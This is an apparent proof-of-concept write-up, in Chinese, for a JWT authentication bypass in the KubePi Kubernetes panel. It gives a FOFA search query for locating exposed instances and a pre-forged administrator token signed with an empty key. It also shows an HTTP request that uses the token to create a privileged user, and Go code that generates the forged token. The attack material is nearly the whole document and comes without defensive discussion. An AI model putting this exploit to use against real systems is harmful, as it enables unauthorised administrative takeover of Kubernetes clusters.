fofa

```
"kubepi"
```

使用空密钥生成jwt token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
```

使用生成的密钥创建用户tang

```
POST /kubepi/api/v1/users HTTP/1.1
Host: 127.0.0.1:9982
Content-Length: 248
sec-ch-ua: 
Accept: application/json, text/plain, */*
lang: zh-CN
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:9982
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:9982/kubepi/user-management/users/create
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
Connection: close

{"apiVersion":"v1","kind":"User","name":"tang","roles":["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"tang","email":"tang@qq.com","authenticate":{"password":"12345678@Tang"},"mfa":{"enable":false,"secret":""}}
```

![image-20240806095638556](KubePi存在JWT验证绕过漏洞.assets/image-20240806095638556.png)

生成jwt 程序

```
package main

import(
"fmt"
"github.com/kataras/iris/v12/middleware/jwt"
"time"
)

var jwtMaxAge =100000* time.Minute

typeUserProfilestruct{
Namestring`json:"name"`
NickNamestring`json:"nickName"`
Emailstring`json:"email"`
Languagestring`json:"language"`
ResourcePermissionsmap[string][]string`json:"resourcePermissions"`
IsAdministratorbool`json:"isAdministrator"`
MfaMfa`json:"mfa"`
}

typeMfastruct{
Enablebool`json:"enable"`
Secretstring`json:"secret"`
Approvedbool`json:"approved"`
}

func main(){
    jwtSigner := jwt.NewSigner(jwt.HS256,"", jwtMaxAge)
    test :=map[string][]string{}
    profile :=UserProfile{
Name:"admin",
NickName:"Administrator",
Email:"support@fit2cloud.com",
Language:"zh-CN",
ResourcePermissions: test,
IsAdministrator:true,
Mfa:Mfa{
Secret:"",
Enable:false,
Approved:false,
},
}
    nonejwt, _ := jwtSigner.Sign(profile)
    fmt.Println(string(nonejwt))
}
```

